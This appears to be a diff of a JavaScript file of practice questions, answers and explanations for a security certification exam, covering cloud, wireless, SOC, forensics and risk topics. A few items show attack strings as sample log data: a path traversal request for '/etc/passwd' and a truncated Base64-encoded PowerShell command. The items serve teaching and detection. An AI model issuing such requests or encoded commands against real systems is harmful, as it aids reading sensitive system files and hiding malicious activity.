+                question: "What is the purpose of a TPM (Trusted Platform Module) in a laptop?",
+                options: ["To accelerate the performance of graphics applications.", "To provide secure, hardware-based cryptographic key storage.", "To increase the amount of available RAM.", "To improve Wi-Fi signal reception."],
+                answer: "To provide secure, hardware-based cryptographic key storage.",
+                explanation: "A TPM is a secure 'crypto-processor', a chip on the motherboard. Its main function is to perform cryptographic operations and store keys (like BitLocker keys) in a tamper-resistant way. The keys cannot be easily extracted from the TPM, even by an attacker with physical access."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A company is using Docker containers. Where is the BEST place to scan for vulnerabilities in third-party libraries (like 'openssl' or 'nginx')?",
+                options: ["On the Hypervisor", "On the Host Operating System", "In the Container Image", "On the Orchestrator (Kubernetes)"],
+                answer: "In the Container Image",
+                explanation: "The container image bundles all dependencies (libraries, binaries, etc.) needed for the application. Container security requires *scanning* these images for known CVEs (vulnerabilities) *before* they are deployed."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "Which protocol provides authentication and encryption for Wi-Fi traffic using AES encryption and replaced the insecure WEP and WPA?",
+                options: ["WPA3", "WPA2", "WEP", "WPS"],
+                answer: "WPA2",
+                explanation: "WPA2 was the standard for many years and introduced the mandatory use of CCMP/AES, which made it significantly more secure than WEP (which used RC4) and WPA (which used TKIP). WPA3 is the newest successor, but WPA2 is the standard that established modern security."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A network administrator is configuring a new switch and wants to mitigate MAC and ARP spoofing attacks. Which switch feature should be implemented?",
+                options: ["802.1X (Port-Based Network Access Control)", "Port Security (Sticky MAC)", "Spanning Tree Protocol (STP)", "VLAN (Virtual Local Area Network)"],
+                answer: "Port Security (Sticky MAC)",
+                explanation: "Port Security allows an admin to limit the number of MAC addresses allowed on a switch port. 'Sticky MAC' mode learns the first MAC address seen on the port and 'sticks' it, preventing an attacker from plugging in another device or spoofing their MAC."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A cloud architect needs to ensure an application's data is replicated to a data center in another geographic region for disaster recovery purposes. This is an example of:",
+                options: ["High Availability", "Resilience", "Geographic Redundancy", "Load Balancing"],
+                answer: "Geographic Redundancy",
+                explanation: "While High Availability (HA) usually refers to surviving a single server failure *within* a datacenter, Geographic Redundancy (or Geo-Redundancy) is a Disaster Recovery (DR) strategy that protects against an *entire* datacenter failure (e.g., earthquake, flood) by replicating data to another location."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "Which of the following is a security benefit of using a microservices architecture instead of a monolithic application?",
+                options: ["It reduces network complexity.", "It allows a failure in one service to be isolated and not take down the entire application.", "It eliminates the need for authentication between services.", "It uses a single large database, which is easier to secure."],
+                answer: "It allows a failure in one service to be isolated and not take down the entire application.",
+                explanation: "This is a benefit of resilience (which is an aspect of security/availability). In a monolith, a memory leak in one module can crash everything. In microservices, if the 'product review' service fails, the 'shopping cart' service can keep running."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A company wants to allow its business partners to access a specific inventory portal, but not its full internal network. What type of network should be set up for this?",
+                options: ["Intranet", "Extranet", "DMZ", "Honeynet"],
+                answer: "Extranet",
+                explanation: "An Extranet is an extension of a company's Intranet that is made available in a controlled way to external parties (like partners, suppliers, or customers). It's a secure Business-to-Business (B2B) portal."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "Which protocol is used for centralized Authentication, Authorization, and Accounting (AAA) and is commonly used for network access (802.1X Wi-Fi, VPNs)?",
+                options: ["Kerberos", "RADIUS", "LDAP", "SAML"],
+                answer: "RADIUS",
+                explanation: "RADIUS (Remote Authentication Dial-In User Service) is the industry-standard protocol for AAA. When you connect to a corporate Wi-Fi, your access point (the 'NAS') is likely contacting a RADIUS server to verify your credentials."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "What is the primary purpose of an 'Air Gap'?",
+                options: ["To improve cooling airflow in a data center.", "To physically isolate a system from all other networks.", "To create a DMZ between two firewalls.", "To implement load balancing for network traffic."],
+                answer: "To physically isolate a system from all other networks.",
+                explanation: "An 'air gap' means the system is physically disconnected from any network, especially the Internet. It is the strongest security control, used for nuclear control systems, critical SCADA systems, etc. Data can only get in or out via physical media (like a USB)."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A company is developing a 'cloud-native' application. Instead of using long-running virtual servers, they use functions that execute code in response to events and then disappear. What is this architecture called?",
+                options: ["Monolithic", "Serverless (FaaS - Function as a Service)", "IaaS", "PaaS"],
+                answer: "Serverless (FaaS - Function as a Service)",
+                explanation: "Serverless (like AWS Lambda or Azure Functions) is a FaaS model where the developer just writes the code (the 'function') and the cloud provider fully manages the execution, scaling, and infrastructure, which is ephemeral (only exists during execution)."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "A system administrator is 'hardening' a new Linux server. Which of the following actions is MOST important?",
+                options: ["Installing a graphical screensaver.", "Changing the default wallpaper.", "Disabling unnecessary services and closing unused ports.", "Renaming the server to a cool name."],
+                answer: "Disabling unnecessary services and closing unused ports.",
+                explanation: "'Hardening' is about reducing a system's 'attack surface'. Every running service (like FTP, telnet, etc.) that is not needed is a security risk and should be disabled."
+            },
+            {
+                domain: "3.0 Security Architecture",
+                question: "Which standard allows a user to authenticate once to an 'Identity Provider' (IdP) and then access multiple 'Service Providers' (SPs) without logging in again?",
+                options: ["RADIUS", "Kerberos", "SAML (Security Assertion Markup Language)", "TACACS+"],
+                answer: "SAML (Security Assertion Markup Language)",
+                explanation: "SAML is the standard that enables federated Single Sign-On (SSO) between different domains and organizations. You log into your Google (IdP) and can then access Salesforce and Slack (SPs) without re-entering your password. The IdP sends a trusted SAML 'assertion'."
             },
             
-            // Domain 3: Security Architecture (18%)
-            {
-                domain: "3.0 Security Architecture",
-                question: "A network architect is designing a secure network topology. They have placed a firewall between the internal corporate network and the internet, and a second firewall to create a separate network segment for publicly accessible servers like web and email servers. What is this segmented network called?",
-                options: ["Honeynet", "Extranet", "Demilitarized Zone (DMZ)", "Intranet"],
-                answer: "Demilitarized Zone (DMZ)",
-                explanation: "A DMZ is a perimeter network that protects an organization's internal LAN from untrusted traffic. It is a separate network segment located between the private network and the internet, hosting public-facing services."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "An organization wants to move its services to the cloud and is looking for a model where the cloud provider manages the hardware, operating system, and middleware, allowing the organization to focus solely on deploying and managing its applications. Which cloud service model BEST fits this requirement?",
-                options: ["Infrastructure as a Service (IaaS)", "Platform as a Service (PaaS)", "Software as a Service (SaaS)", "Anything as a Service (XaaS)"],
-                answer: "Platform as a Service (PaaS)",
-                explanation: "PaaS provides a platform including the OS, middleware, and runtime environment, abstracting away the underlying infrastructure. This allows developers to build and deploy applications without managing servers. IaaS only provides virtualized hardware, and SaaS provides a complete application."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A company is implementing a zero-trust security model. Which of the following is a core principle of this model?",
-                options: ["Trust all devices on the corporate LAN.", "Authenticate and authorize every access request, regardless of its origin.", "Once a user is authenticated, grant them broad access.", "Focus security efforts primarily on the network perimeter."],
-                answer: "Authenticate and authorize every access request, regardless of its origin.",
-                explanation: "The core tenet of zero trust is 'never trust, always verify.' It assumes that no user or device is trusted by default, whether inside or outside the network. Every access request must be explicitly authenticated and authorized before being granted."
-            },
-             {
-                domain: "3.0 Security Architecture",
-                question: "A security engineer is configuring a new wireless network and wants to use the most secure authentication and encryption protocol available. Which of the following should they implement?",
-                options: ["WEP", "WPA with TKIP", "WPA2 with AES", "WPA3 with SAE"],
-                answer: "WPA3 with SAE",
-                explanation: "WPA3 is the latest and most secure standard for wireless networks. It replaces the WPA2 Pre-Shared Key (PSK) with Simultaneous Authentication of Equals (SAE), which provides stronger protection against offline dictionary attacks. WEP and WPA are outdated and insecure."
-            },
-            {
-                domain: "3.0 Security Architecture",
-                question: "A DevOps team is adopting a security practice where security is integrated into every stage of the software development lifecycle, from design to deployment. What is this practice called?",
-                options: ["Agile development", "Waterfall model", "Continuous integration", "DevSecOps"],
-                answer: "DevSecOps",
-                explanation: "DevSecOps is the philosophy of integrating security practices within the DevOps process. It aims to automate security checks and balances throughout the CI/CD pipeline, making security a shared responsibility rather than a final gate before release."
-            },
-
-            // Domain 4: Security Operations (28%)
+            // --- Domain 4: Security Operations (28%) ---
             {
                 domain: "4.0 Security Operations",
-                question: "A security analyst in a Security Operations Center (SOC) is reviewing logs and sees a series of failed login attempts for a privileged account from an unfamiliar IP address, followed by a successful login. What is the MOST likely next step for the analyst?",
-                options: ["Document the event and close the ticket.", "Immediately disable the privileged account and investigate further.", "Block the unfamiliar IP address at the firewall.", "Contact the owner of the privileged account to verify the activity."],
-                answer: "Immediately disable the privileged account and investigate further.",
-                explanation: "Given the high risk associated with a compromised privileged account, the principle of 'containment' dictates taking immediate action to prevent further damage. Disabling the account stops the potential attacker's access while a full investigation begins. Contacting the user or blocking the IP are good secondary steps but disabling the account is the priority."
+                question: "A SOC analyst receives a high-priority alert from an EDR: the process `powershell.exe` has initiated a network connection to a known Command and Control (C2) IP. What is the MOST appropriate and immediate incident response action?",
+                options: ["Start a vulnerability scan on the host.", "Block the C2 IP on the corporate firewall.", "Isolate the host from the network.", "Pull a forensic image of the hard drive."],
+                answer: "Isolate the host from the network.",
+                explanation: "This is the *Containment* step. The host is actively compromised and communicating with the attacker. Isolating the host (disconnecting it from the network) is the immediate action to stop attacker lateral movement and data exfiltration, before any further analysis."
             },
             {
                 domain: "4.0 Security Operations",
-                question: "In digital forensics, what is the primary purpose of creating a hash of a collected evidence drive?",
-                options: ["To encrypt the evidence for confidentiality.", "To compress the evidence to save storage space.", "To prove the integrity of the evidence has been maintained.", "To scan the evidence for malware."],
-                answer: "To prove the integrity of the evidence has been maintained.",
-                explanation: "Hashing creates a unique digital fingerprint of the data. By hashing the original drive and any forensic copies, investigators can prove that the evidence has not been altered. Any change to the data, however small, will result in a completely different hash value."
+                question: "According to the 'Order of Volatility', which of the following items should be collected FIRST during a forensic investigation of a live system?",
+                options: ["Log files from the hard drive", "CPU registers and L1/L2 cache", "RAM contents", "Hard drive image"],
+                answer: "CPU registers and L1/L2 cache",
+                explanation: "The Order of Volatility dictates you collect the most transient (fastest to disappear) data first. The order is: CPU Registers/Cache > RAM (and routing/ARP tables) > Temporary files/Disk."
             },
             {
                 domain: "4.0 Security Operations",
-                question: "A company's disaster recovery plan specifies a maximum acceptable downtime of 4 hours for critical systems. This metric is known as the:",
-                options: ["Recovery Time Objective (RTO)", "Recovery Point Objective (RPO)", "Mean Time To Recovery (MTTR)", "Mean Time Between Failures (MTBF)"],
+                question: "A security analyst is reviewing the following log from a Network IDS (NIDS). What is being indicated?",
+                extraContent: `<div class="code-block">ALERT: TCP 192.168.1.10:51234 -> 10.5.5.5:80 "GET /etc/passwd"</div>`,
+                options: ["A SQL Injection attack", "A Path Traversal attack", "A Port Scan", "A DDoS attack"],
+                answer: "A Path Traversal attack",
+                explanation: "The attacker is attempting to access the `/etc/passwd` file, which stores user information on Linux systems. By using `..%2f` or simply `/etc/passwd` in a web request, they are trying to 'traverse' out of the web root directory to read sensitive system files."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "What is the primary difference between an IDS (Intrusion Detection System) and an IPS (Intrusion Prevention System)?",
+                options: ["IDS is host-based, IPS is network-based.", "IDS is passive (alerts only), IPS is active (can block).", "IDS uses signatures, IPS uses behavior.", "IDS is for internal threats, IPS is for external threats."],
+                answer: "IDS is passive (alerts only), IPS is active (can block).",
+                explanation: "An IDS (Detection) sits 'out-of-band', sees a copy of traffic, and generates an *alert* if it sees something bad. An IPS (Prevention) sits 'in-line', traffic passes *through* it, and it can actively *block* or *drop* malicious packets."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A SOC analyst is overwhelmed with thousands of alerts per day, most of which are false positives. Which technology platform is designed to help automate the response to these alerts using 'playbooks'?",
+                options: ["SIEM (Security Information and Event Management)", "SOAR (Security Orchestration, Automation, and Response)", "EDR (Endpoint Detection and Response)", "NIDS (Network Intrusion Detection System)"],
+                answer: "SOAR (Security Orchestration, Automation, and Response)",
+                explanation: "The SIEM collects and alerts. The SOAR takes action. A SOAR integrates with the SIEM and other tools (Firewall, EDR, Active Directory) and uses 'playbooks' to automate response tasks: 'If SIEM alerts on malware, run playbook: (1) Query hash in VirusTotal, (2) Isolate host via EDR, (3) Block IP on Firewall'."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "What is the purpose of creating a 'hash' of a hard drive (e.g., `dd if=/dev/sda | sha256sum`) before beginning a forensic analysis?",
+                options: ["To encrypt the disk and protect the evidence.", "To create a backup copy of the data.", "To verify the integrity of the evidence and prove it has not been altered.", "To compress the disk image to save space."],
+                answer: "To verify the integrity of the evidence and prove it has not been altered.",
+                explanation: "The hash serves as a digital seal. The analyst hashes the original drive (evidence) and then hashes their forensic copy (image). The hashes must match. This proves the 'Chain of Custody' and that the analysis was done on an exact copy, without tampering with the original."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A company is conducting a 'black-box penetration test'. What does this mean for the testing team?",
+                options: ["The team has full access to source code and network diagrams.", "The team has partial access, such as a regular user's credentials.", "The team has no prior knowledge of the target environment.", "The team is only focused on testing physical security."],
+                answer: "The team has no prior knowledge of the target environment.",
+                explanation: "Black-Box simulates a real-world external attacker. The testers are given nothing but the company name or IP/URL. White-Box has full knowledge. Gray-Box has partial knowledge (e.g., an employee login)."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A security analyst is using Wireshark to analyze a packet capture (PCAP) and sees a large number of TCP packets with the [SYN] flag from a single source IP to many ports on a server. What does this indicate?",
+                options: ["A Denial of Service (DDoS) attack", "A Port Scan", "Normal web browsing traffic", "Data exfiltration via DNS"],
+                answer: "A Port Scan",
+                explanation: "This is the classic behavior of a port scan, such as 'Nmap -sS' (SYN Scan). The attacker sends SYN packets to a range of ports to see which ones respond (SYN/ACK = Open, RST = Closed), identifying running services."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "During malware incident response, the team has removed the malware, patched the exploited vulnerability, and verified the system is clean. What is the NEXT phase in the (NIST) IR lifecycle?",
+                options: ["Containment", "Detection and Analysis", "Recovery", "Post-Incident Activities (Lessons Learned)"],
+                answer: "Recovery",
+                explanation: "The phases are: Preparation -> Detection/Analysis -> Containment, Eradication, Recovery -> Post-Incident. The analyst just completed *Eradication* (removing malware, patching). The next step is *Recovery*, which involves restoring the system to normal operation and monitoring it closely."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A company wants to test its disaster recovery plan but cannot afford the interruption of shutting down production systems. What is the MOST comprehensive test they can perform without affecting production?",
+                options: ["Tabletop Exercise", "Walkthrough", "Parallel Test", "Full-Interruption Test"],
+                answer: "Parallel Test",
+                explanation: "A Parallel Test involves activating the DR site (Hot/Warm Site) and running the backup systems *in parallel* with the production systems. Users can be directed to the DR site to test functionality without the production site being shut down."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "What is a 'Honeypot'?",
+                options: ["A database server used to securely store credentials.", "A deliberately vulnerable system set up to attract and log attackers.", "A hardware token used for multi-factor authentication.", "A nickname for a junior security analyst."],
+                answer: "A deliberately vulnerable system set up to attract and log attackers.",
+                explanation: "A Honeypot is a detection and research tool. It looks like a real system (e.g., a web server, a SCADA system) but has no production value. Anyone interacting with it is, by definition, an attacker. It is used to study their techniques (TTPs)."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A security analyst is using Nmap to scan a host with the command `nmap -sV -O 10.1.1.5`. What are the `-sV` and `-O` flags instructing Nmap to do?",
+                options: ["Perform a very fast and noisy scan.", "Perform a stealth (SYN) scan and use an evasion script.", "Attempt to detect the Service Version and Operating System.", "Scan all 65,535 ports and save the output to XML."],
+                answer: "Attempt to detect the Service Version and Operating System.",
+                explanation: "`-sV` is for Service Version detection (tries to find out if port 80 is 'Apache 2.4.1' or 'IIS 10.0'). `-O` is for Operating System (OS) detection using TCP/IP fingerprinting."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "What is the primary function of a SIEM (Security Information and Event Management)?",
+                options: ["To block denial of service attacks at the network edge.", "To provide a sandbox for safely analyzing malware.", "To aggregate, correlate, and alert on log data from multiple sources.", "To manage user identities and provision access."],
+                answer: "To aggregate, correlate, and alert on log data from multiple sources.",
+                explanation: "A SIEM's primary strength is *correlation*. It collects logs from firewalls, servers, workstations, EDRs, etc., and correlates them to find patterns. One failed login (low alert) + one suspicious file (low alert) + one C2 beacon (low alert) = one *high-priority* alert."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A forensic analyst is imaging a hard drive and uses the `dd` command. What is the primary difference between using `dd` and simply copying and pasting the files?",
+                options: ["`dd` is faster than copy/paste.", "`dd` creates a bit-for-bit (forensic) copy of the disk, including unallocated space and deleted files.", "`dd` compresses the image to save space.", "`dd` ignores bad sectors that a normal copy would not."],
+                answer: "`dd` creates a bit-for-bit (forensic) copy of the disk, including unallocated space and deleted files.",
+                explanation: "A logical copy (copy/paste) only gets the 'live' files the OS sees. A forensic image (made with `dd`, `FTK Imager`, etc.) copies *every single bit* on the disk, which is crucial for recovering deleted files and analyzing unallocated (slack) space."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "An incident response team is handling a major breach. Senior management tells the team to 'stop investigating and just restore everything from backup' immediately. This action skips which critical IR phase?",
+                options: ["Preparation", "Eradication", "Recovery", "Containment"],
+                answer: "Eradication",
+                explanation: "Restoring from backup (Recovery) without first finding the root cause and eliminating it (Eradication) is a critical mistake. If the vulnerability (e.g., an RCE) or the attacker's foothold (e.g., a compromised account) is not fixed, the attacker will simply re-breach the system after the restore."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "Which Linux command-line tool is used for capturing, filtering, and analyzing network traffic directly from the terminal?",
+                options: ["nmap", "netstat", "tcpdump", "ping"],
+                answer: "tcpdump",
+                explanation: "`tcpdump` is the command-line 'Wireshark'. It allows you to capture network packets (e.g., `tcpdump -i eth0`) and apply powerful filters (e.g., `tcpdump -i eth0 'port 80'`). `nmap` is for scanning, `netstat` is for viewing local connections."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A security analyst uses the `netstat -anob` command on a compromised Windows server. What will this command show?",
+                options: ["The active firewall rules on the server.", "The running processes and their CPU usage.", "All network connections (active and listening), the PIDs, and the executable name that owns them.", "The Windows security event logs."],
+                answer: "All network connections (active and listening), the PIDs, and the executable name that owns them.",
+                explanation: "`netstat` displays network statistics. `-a` shows all connections (active and listening). `-n` shows addresses and ports numerically (no DNS/name resolution). `-o` shows the Process ID (PID) owning the connection. `-b` shows the executable (binary) name. This is a crucial command for finding which process is making a malicious connection."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A SOC analyst receives an alert for 'Multiple Failed Logins Followed by Success from an Atypical IP'. This is a SIEM rule based on:",
+                options: ["A known malware signature", "A vulnerability scan result", "An event correlation rule", "A malicious file hash"],
+                answer: "An event correlation rule",
+                explanation: "This is not a single event, but a *sequence* of events (Failed Login + Failed Login + ... + Successful Login + Atypical IP) that, when *correlated* in a short time, indicates an attack (like a successful Brute Force or Password Spray)."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "What is 'Chain of Custody' in a forensics context?",
+                options: ["The order of volatility for data.", "A document that chronologically records who had possession of the evidence.", "The process of encrypting evidence for transport.", "The hardware used to perform the forensic copy."],
+                answer: "A document that chronologically records who had possession of the evidence.",
+                explanation: "The Chain of Custody is the legal record of who collected, handled, transported, and stored the evidence, and when. Any gap or failure to document this can make the evidence inadmissible in court."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A company is conducting a 'purple team exercise'. What is the objective of this exercise?",
+                options: ["The blue team (defense) tries to stop the red team (offense) in real-time.", "The red team tries to breach and the blue team tries to detect, but they do not communicate.", "The red team (offense) and blue team (defense) work together collaboratively to improve security.", "A management team decides on the security budget."],
+                answer: "The red team (offense) and blue team (defense) work together collaboratively to improve security.",
+                explanation: "A 'Purple Team' exercise is not a competition, but a collaboration. The Red Team says, 'I am going to execute this C2 technique now.' The Blue Team responds, 'OK, I didn't see that in the SIEM. Let's adjust the rule.' It's an immediate feedback loop to improve detection and response."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "Which of the following frameworks is a 'map' of adversary Tactics, Techniques, and Procedures (TTPs)?",
+                options: ["MITRE ATT&CK Framework", "MITRE CVE (Common Vulnerabilities and Exposures)", "OWASP Top 10", "NIST Cybersecurity Framework (CSF)"],
+                answer: "MITRE ATT&CK Framework",
+                explanation: "The ATT&CK framework is a global knowledge base of adversary *behaviors*. It organizes techniques (e.g., 'Pass-the-Hash', 'Spear Phishing') into tactics (e.g., 'Lateral Movement', 'Initial Access'). It is used by Blue and Red teams to model threats and assess detection coverage."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A security analyst is using the `strings` command on a malware binary. What is the purpose of this tool?",
+                options: ["To run the malware in a safe (sandboxed) environment.", "To decompile the binary back into source code.", "To extract readable text (ASCII/Unicode) sequences from the file.", "To check if the file's hash is in a malware database."],
+                answer: "To extract readable text (ASCII/Unicode) sequences from the file.",
+                explanation: "The `strings` tool looks for printable character sequences in a binary file. This is useful in static malware analysis to quickly find 'clues' like IP addresses, C2 URLs, filenames, registry keys, or debug messages."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "An Intrusion Detection System (IDS) alerts on an attack, but upon investigation, the analyst determines the traffic was legitimate (e.g., an authorized vulnerability scan). This event is a:",
+                options: ["True Positive", "True Negative", "False Positive", "False Negative"],
+                answer: "False Positive",
+                explanation: "A False Positive is a 'false alarm'. The IDS alerted (Positive), but it was wrong (False). A False Negative is the worst-case scenario: a real attack occurred, but the IDS did *not* alert (Negative), and it was wrong (False)."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A SOC analyst sees an EDR alert for the following command being run on a marketing employee's laptop. What is the concern?",
+                extraContent: `<div class="code-block">powershell -enc aWUA...[long base64 string]...</div>`,
+                options: ["The user is clearing their browser cache.", "The user is running a PowerShell command, which is normal.", "The user is running an obfuscated (Base64) PowerShell script, which is highly suspicious.", "The user is installing a new printer."],
+                answer: "The user is running an obfuscated (Base64) PowerShell script, which is highly suspicious.",
+                explanation: "The `-enc` (or `-encodedcommand`) flag in PowerShell is used to execute a Base64-encoded command. Attackers (and 'fileless' malware) love this because the command itself doesn't appear in command-line logs, just the Base64 string. It's a classic obfuscation technique and a huge red flag."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "Which tool is used for network and system vulnerability scanning, identifying open ports, services, and known CVEs?",
+                options: ["Wireshark", "Nessus", "Metasploit", "Aircrack-ng"],
+                answer: "Nessus",
+                explanation: "Nessus (as well as OpenVAS and Qualys) is a vulnerability scanner. It actively scans hosts for ports, services, and most importantly, compares what it finds against a database of known vulnerabilities (CVEs) to generate a risk report."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "A system administrator needs to collect the RAM from a compromised Linux server for forensic analysis. Which command-line tool is commonly used for this?",
+                options: ["dd", "Volatility", "LiME (Linux Memory Extractor)", "Autopsy"],
+                answer: "LiME (Linux Memory Extractor)",
+                explanation: "`LiME` is a loadable kernel module (LKM) designed specifically to acquire a volatile memory (RAM) image from a Linux system. `Volatility` is used to *analyze* the memory image after it's collected. `dd` can be used, but it's more complex and error-prone for RAM."
+            },
+            {
+                domain: "4.0 Security Operations",
+                question: "Which memory forensics framework is used to extract information (like running processes, network connections, cached passwords) from a RAM dump?",
+                options: ["Volatility", "Sleuth Kit", "Autopsy", "EnCase"],
+                answer: "Volatility",
+                explanation: "Volatility is the industry-standard open-source framework for *analyzing* RAM dumps from Windows, Linux, and Mac. It allows an analyst to 'carve' the captured memory for artifacts of an attack."
+            },
+        
+            // --- Domain 5: Security Program Management and Oversight (20%) ---
+            {
+                domain: "5.0 Security Program Management and Oversight",
+                question: "A company calculates that if its primary e-commerce server fails, it will lose $10,000 per hour. Management decides it can tolerate a maximum of 2 hours of downtime. These 2 hours represent the:",
+                options: ["Recovery Time Objective (RTO)", "Recovery Point Objective (RPO)", "Mean Time To Repair (MTTR)", "Annualized Loss Expectancy (ALE)"],
                 answer: "Recovery Time Objective (RTO)",
-                explanation: "RTO defines the target time within which a business process must be restored after a disaster to avoid unacceptable consequences. RPO defines the acceptable amount of data loss, measured in time (e.g., 1 hour of data)."
-            },
-             {
-                domain: "4.0 Security Operations",
-                question: "A SOC analyst uses a tool that aggregates log data from firewalls, servers, and applications, correlates events, and generates alerts for suspicious activity. What is this tool?",
-                options: ["Vulnerability scanner", "Network sniffer", "Security Information and Event Management (SIEM)", "Intrusion Detection System (IDS)"],
-                answer: "Security Information and Event Management (SIEM)",
-                explanation: "A SIEM is the central platform for log aggregation, correlation, and analysis in a SOC. It collects security data from across the enterprise, providing a unified view to detect and respond to threats. An IDS detects threats, but a SIEM correlates data from many sources, including the IDS."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "During an incident response, an analyst needs to collect evidence from a running server. According to the order of volatility, which of the following should be collected FIRST?",
-                options: ["Hard drive image", "Archived logs", "CPU registers and cache memory", "Running processes"],
-                answer: "CPU registers and cache memory",
-                explanation: "The order of volatility dictates collecting the most transient data first. CPU registers and cache are the most volatile, followed by RAM (including running processes), temporary file systems, and finally, data on the hard drive. Archived logs are typically the least volatile."
-            },
-            {
-                domain: "4.0 Security Operations",
-                question: "An organization is conducting a penetration test. The testing team is provided with user-level credentials and network diagrams. What type of penetration test is this?",
-                options: ["Black-box test", "White-box test", "Gray-box test", "Red-team exercise"],
-                answer: "Gray-box test",
-                explanation: "A gray-box test simulates an attacker with some level of internal knowledge or access, such as a standard user account. A white-box test provides full knowledge (source code, admin access), while a black-box test provides no prior knowledge."
-            },
-
-            // Domain 5: Security Program Management and Oversight (20%)
-            {
-                domain: "5.0 Security Program Management and Oversight",
-                question: "A company is assessing the risk of a server failure. The server is valued at $50,000, and it is estimated that a failure would occur once every 4 years, resulting in a 25% loss of the server's value. What is the Annualized Loss Expectancy (ALE)?",
-                options: ["$12,500", "$3,125", "$5,000", "$200,000"],
-                answer: "$3,125",
-                explanation: "First, calculate the Single Loss Expectancy (SLE): Asset Value ($50,000) * Exposure Factor (0.25) = $12,500. Then, calculate the Annualized Rate of Occurrence (ARO): 1 occurrence / 4 years = 0.25. Finally, calculate ALE: SLE ($12,500) * ARO (0.25) = $3,125."
+                explanation: "RTO is the *Time* objective for recovery. It is the business metric defining the maximum acceptable time a system can be down before the business suffers unacceptable impact. (RPO refers to *data loss*)."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "Which of the following documents is a formal agreement between a service provider and a customer that defines the level of service, responsibilities, and performance metrics?",
-                options: ["Memorandum of Understanding (MOU)", "Service Level Agreement (SLA)", "Business Partnership Agreement (BPA)", "Interconnection Security Agreement (ISA)"],
-                answer: "Service Level Agreement (SLA)",
-                explanation: "An SLA is a contract that specifies measurable metrics like uptime, response time, and issue resolution time. An MOU is a less formal agreement of intent, a BPA is for business partners, and an ISA is for connecting systems between different organizations."
+                question: "A company calculates its customer database is worth $500,000. It's estimated a data breach (occurring once every 4 years) would result in a 20% loss of the database's value (Exposure Factor). What is the Annualized Loss Expectancy (ALE)?",
+                options: ["$100,000", "$125,000", "$25,000", "$500,000"],
+                answer: "$25,000",
+                explanation: "1. Calculate SLE (Single Loss Expectancy): $500,000 (Asset Value) * 0.20 (Exposure Factor) = $100,000. \n2. Calculate ARO (Annualized Rate of Occurrence): 1 occurrence / 4 years = 0.25. \n3. Calculate ALE (Annualized Loss Expectancy): $100,000 (SLE) * 0.25 (ARO) = $25,000."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A company requires that all departing employees' system access is revoked on their last day of employment. This is an example of what type of security control?",
-                options: ["A detective control", "A corrective control", "A preventative control", "An administrative control"],
-                answer: "An administrative control",
-                explanation: "This is an administrative (or procedural) control because it's a policy or procedure related to personnel management (offboarding). It's also preventative in nature, but its primary classification is administrative, as it's enforced by a business process rather than a technical system."
+                question: "A risk management team identifies a vulnerability. The cost to fix it is $150,000. The Annualized Loss Expectancy (ALE) for this vulnerability is $10,000. What is the MOST likely risk management decision?",
+                options: ["Mitigate the risk", "Transfer the risk", "Avoid the risk", "Accept the risk"],
+                answer: "Accept the risk",
+                explanation: "The golden rule of risk management is: the cost of the countermeasure ($150k) should not exceed the cost of the risk ($10k per year). Since the fix is far more expensive than the risk, the most logical business decision is to *accept* the risk and do nothing (or implement a cheaper control)."
             },
-             {
+            {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "An organization is legally required to retain financial records for seven years. This is an example of a:",
-                options: ["Data retention policy", "Data classification policy", "Acceptable use policy", "Disaster recovery plan"],
-                answer: "Data retention policy",
-                explanation: "A data retention policy defines how long data must be kept and how it should be disposed of at the end of its lifecycle. These policies are often driven by legal, regulatory, and business requirements. The other policies serve different purposes."
+                question: "A company decides to stop accepting credit card payments to avoid having to comply with PCI DSS regulations. What type of risk response is this?",
+                options: ["Mitigate", "Transfer", "Avoid", "Accept"],
+                answer: "Avoid",
+                explanation: "Risk Avoidance is the only response that eliminates 100% of the risk. This is done by stopping the business activity that introduces the risk (in this case, processing credit cards)."
             },
-             {
+            {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A bank wants to conduct a security assessment to ensure it is compliant with the Payment Card Industry Data Security Standard (PCI DSS). What is the primary focus of this type of assessment?",
-                options: ["Protecting Protected Health Information (PHI)", "Ensuring the security of classified government data", "Securing the Cardholder Data Environment (CDE)", "Validating general cybersecurity best practices"],
-                answer: "Securing the Cardholder Data Environment (CDE)",
-                explanation: "PCI DSS is a security standard specifically designed to protect cardholder data. Its requirements are focused on securing the CDE, which includes all systems, processes, and people that store, process, or transmit credit card information."
-            },
-
